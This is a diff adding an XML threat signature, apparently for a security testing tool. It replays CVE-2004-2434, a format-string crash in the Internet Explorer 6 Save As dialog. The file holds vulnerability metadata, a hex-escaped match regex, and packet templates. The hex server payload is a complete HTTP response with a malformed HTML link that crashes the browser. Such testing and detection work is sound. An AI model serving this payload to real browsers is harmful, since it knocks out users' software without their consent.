@@ -1,0 +1,87 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="Microsoft Internet Explorer Save As Denial Of Service"/>
+    <EngDesc display="true" value="This attack takes advantage of a format string vulnerability in the save as dialog when handling an invalid URL.  This threat sends a website that when viewed by Internet Explorer will cause it to crash.  This threat is a client attack that comes from the virtual server."/>
+    <Intent display="true">
+      <item value="Crashing"/>
+    </Intent>
+    <Protocol display="true" value="HTTP"/>
+    <Type_Of_Equipment display="true">
+      <item value="Web_Browser"/>
+    </Type_Of_Equipment>
+    <Known_Vendors_Affected display="true">
+      <item value="Microsoft"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="Internet_Explorer"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true">
+      <item value="Internet_Explorer_6.1"/>
+    </Known_Versions_Affected>
+    <Credit display="true" value="http://theinsider.deep-ice.com/texts/advisory60.txt"/>
+    <CVEID display="true" value="CVE-2004-2434"/>
+    <bugtraqID display="true" value=""/>
+    <OSVDB display="true" value="8335"/>
+    <Author display="true" value="Chuck McAuley"/>
+    <ID display="true" value="0000010288833c8000c000a80001003c62adb07f"/>
+    <Revision display="true" value="1"/>
+    <Safe display="true" value="true"/>
+    <SoftwareRevision display="true" value="1.4"/>
+    <Suite display="true" value="Standard"/>
+    <RunOnce display="false" value="true"/>
+    <Valid_Traffic display="false" value="false"/>
+    <AccessVector display="false" value="remote"/>
+    <AccessComplexity display="false" value="low"/>
+    <Authentication display="false" value="not-required"/>
+    <ConfImpact display="false" value="none"/>
+    <IntegImpact display="false" value="none"/>
+    <AvailImpact display="false" value="complete"/>
+    <ImpactBias display="false" value="normal"/>
+    <FirstAdded display="false" value=""/>
+    <LastModified display="false" value="632726589718125000"/>
+    <SigStyle display="false" value="Matching"/>
+    <targetNode display="false" value="B"/>
+    <SigProtocol display="false" value="TCP"/>
+    <Rate display="false" value="1"/>
+    <Regex display="false" value="\X48\X54\X54\X50\X2F\X31\X2E\X31\X20\X32\X30\X30\X20\X4F\X4B\X0D\X0A\X44\X61\X74\X65\X3A\X20\X54\X68\X75\X2C\X20\X30\X33\X20\X4D\X61\X72\X20\X32\X30\X30\X35\X20\X31\X36\X3A\X34\X35\X3A\X33\X37\X20\X47\X4D\X54\X0D\X0A\X53\X65\X72\X76\X65\X72\X3A\X20\X41\X70\X61\X63\X68\X65\X2F\X32\X2E\X30\X2E\X34\X30\X20\X28\X52\X65\X64\X20\X48\X61\X74\X20\X4C\X69\X6E\X75\X78\X29\X0D\X0A\X4C\X61\X73\X74\X2D\X4D\X6F\X64\X69\X66\X69\X65\X64\X3A\X20\X54\X68\X75\X2C\X20\X30\X33\X20\X4D\X61\X72\X20\X32\X30\X30\X35\X20\X31\X36\X3A\X34\X34\X3A\X32\X33\X20\X47\X4D\X54\X0D\X0A\X45\X54\X61\X67\X3A\X20\X22\X31\X31\X63\X39\X31\X2D\X33\X65\X2D\X35\X37\X39\X30\X34\X37\X63\X30\X22\X0D\X0A\X41\X63\X63\X65\X70\X74\X2D\X52\X61\X6E\X67\X65\X73\X3A\X20\X62\X79\X74\X65\X73\X0D\X0A\X43\X6F\X6E\X74\X65\X6E\X74\X2D\X4C\X65\X6E\X67\X74\X68\X3A\X20\X36\X32\X0D\X0A\X43\X6F\X6E\X6E\X65\X63\X74\X69\X6F\X6E\X3A\X20\X63\X6C\X6F\X73\X65\X0D\X0A\X43\X6F\X6E\X74\X65\X6E\X74\X2D\X54\X79\X70\X65\X3A\X20\X74\X65\X78\X74\X2F\X68\X74\X6D\X6C\X3B\X20\X63\X68\X61\X72\X73\X65\X74\X3D\X49\X53\X4F\X2D\X38\X38\X35\X39\X2D\X31\X0D\X0A\X0D\X0A\X3C\X48\X54\X4D\X4C\X3E\X0D\X0A\X3C\X42\X4F\X44\X59\X3E\X0D\X0A\X3C\X41\X20\X68\X72\X65\X66\X3D\X3A\X3A\X25\X37\X42\X3E\X72\X69\X67\X68\X74\X63\X6C\X69\X63\X6B\X3C\X2F\X61\X3E\X0D\X0A\X3C\X2F\X42\X4F\X44\X59\X3E\X0D\X0A\X3C\X2F\X68\X54\X4D\X4C\X3E"/>
+    <Created value="1139462095" display="false"/>
+    <ServerSideAttack display="false" value="false"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="sourceMAC" type="ImperfectControls.MacAddress" value="null" index="C"/>
+    <NamedVar name="destMAC" type="ImperfectControls.MacAddress" value="null" index="D"/>
+    <NamedVar name="sourceIP" type="ImperfectControls.IPv4Address" value="null" index="E"/>
+    <NamedVar name="destIP" type="ImperfectControls.IPv4Address" value="null" index="F"/>
+    <NamedVar name="HTTPdestPort" type="ImperfectControls.Port" value="null" index="G"/>
+  </Variables>
+  <Loops>
+    <for index="A">
+      <for index="C"/>
+      <for index="D"/>
+      <for index="E"/>
+      <for index="F"/>
+      <for index="G"/>
+    </for>
+    <for index="B"/>
+  </Loops>
+  <Output index="A" Count="">
+    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="0800">
+      <IP Version="04" InternetHeaderLength="05" TypeofService="10" TotalLength="004E" Identification="13B8" FragmentOffset="0000" TTL="40" Protocol="06" HeaderChecksum="28E0" srcIP="$sourceIP" destIP="$destIP" options="" CE="false" DF="true" MF="false">
+        <TCP srcPort="@random(1026, 65535)" destPort="$HTTPdestPort" SeqNumber="6F76885E" AckNumber="6F058942" HeaderLength="08" WindowSize="7FFF" Checksum="FE42" UrgentPointer="0000" Options="0101080A0078BA8B00789BEB" Payload="474554202F73617661732E68746D6C20485454502F312E300D0A0D0A" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+      </IP>
+    </Ethernet>
+  </Output>
+  <Input>
+    <Ethernet/>
+  </Input>
+  <ServerSide display="1">
+    <Output index="B" Count="">
+      <Ethernet srcMac="00:00:00:00:00:00" destMac="00:00:00:00:00:00" pktType="0800">
+        <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="0184" Identification="12AB" FragmentOffset="0000" TTL="40" Protocol="06" HeaderChecksum="28C7" srcIP="127.0.0.1" destIP="127.0.0.1" options="" CE="false" DF="true" MF="false">
+          <TCP srcPort="80" destPort="33120" SeqNumber="6F058942" AckNumber="6F76887A" HeaderLength="08" WindowSize="7FFF" Checksum="FF78" UrgentPointer="0000" Options="0101080A0078BBC60078BBC4" Payload="485454502F312E3120323030204F4B0D0A446174653A205468752C203033204D617220323030352031363A34353A333720474D540D0A5365727665723A204170616368652F322E302E3430202852656420486174204C696E7578290D0A4C6173742D4D6F6469666965643A205468752C203033204D617220323030352031363A34343A323320474D540D0A455461673A202231316339312D33652D3537393034376330220D0A4163636570742D52616E6765733A2062797465730D0A436F6E74656E742D4C656E6774683A2036320D0A436F6E6E656374696F6E3A20636C6F73650D0A436F6E74656E742D547970653A20746578742F68746D6C3B20636861727365743D49534F2D383835392D310D0A0D0A3C48544D4C3E0D0A3C424F44593E0D0A3C4120687265663D3A3A2537423E7269676874636C69636B3C2F613E0D0A3C2F424F44593E0D0A3C2F68544D4C3E" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+        </IP>
+      </Ethernet>
+    </Output>
+  </ServerSide>
+</threatSignature>
